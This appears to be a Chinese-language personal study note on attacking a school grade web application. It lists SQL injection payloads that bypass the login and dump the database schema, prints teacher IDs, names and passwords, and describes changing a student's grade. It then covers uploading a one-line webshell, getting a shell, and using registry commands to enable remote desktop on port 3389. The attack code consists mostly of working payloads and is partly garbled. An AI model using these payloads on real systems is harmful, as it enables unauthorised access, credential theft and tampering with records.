#### 密码绕过与木马上传

#### 基础

1.‘ or 1=1 #绕过

![image-20210119172900587](D:/Vs Workstation/note/img/image-20210119172900587.png)


![image-20210119180645483](D:/Vs Workstation/note/img/image-20210119180645483.png)![image-20210119172909455](D:/Vs Workstation/note/img/image-20210119172909455.png)

```
1'or 1=1 #
```

![image-20210119210224567](D:/Vs Workstation/note/img/image-20210119210224567.png)

```
' union select 1
```

![image-20210119210405118](D:/Vs Workstation/note/img/image-20210119210405118.png)

![image-20210119210520518](D:/Vs Workstation/note/img/image-20210119210520518.png)

```
'union select database()#
```



![image-20210119210622783](D:/Vs Workstation/note/img/image-20210119210622783.png)

```
' union select group_concat(table_name) from information_schema.tables where table_schema='grade'#
```

![image-20210119215423529](D:/Vs Workstation/note/img/image-20210119215423529.png)

```
' union select group_concat(column_name) from information_schemas.columns where table_name ='admins' and table_schema =database()#
```

![image-20210119220843021](D:/Vs Workstation/note/img/image-20210119220843021.png)

```
' union select group_concat(id,'',name,'',pass,'')from teachers#
```

![image-20210119221303581](D:/Vs Workstation/note/img/image-20210119221303581.png)

```
2001 fengwanzhong feng001
2002 yunankun   yu002
```

![image-20210119221627652](D:/Vs Workstation/note/img/image-20210119221627652.png)

```
爆出学生名字
```

![image-20210119222335012](D:/Vs Workstation/note/img/image-20210119222335012.png)

![image-20210119222527028](D:/Vs Workstation/note/img/image-20210119222527028.png)

可以看到该学生的英语被夸张的修改

![image-20210119222609202](D:/Vs Workstation/note/img/image-20210119222609202.png)![image-2021011)

#### 代码审计

二、利用工具代码审计及一句话木马

1.1信息泄露审计

 ![image-20210119223639825](D:/Vs Workstation/note/img/image-20210119223639825.png)

1.2上传木马
![image-20210119223140179](D:/Vs Workstation/note/img/image-20210119223140179.png)

1.3获取shell
![image-20210119223717650](D:/Vs Workstation/note/img/image-20210119223717650.png)

拓展开启3389端口

```
1）开启3389端口：

在cmd内，执行如下命令，即可开启3389端口。

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

2）关闭3389端口：

在cmd内，执行如下命令，即可关闭3389端口。

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
```

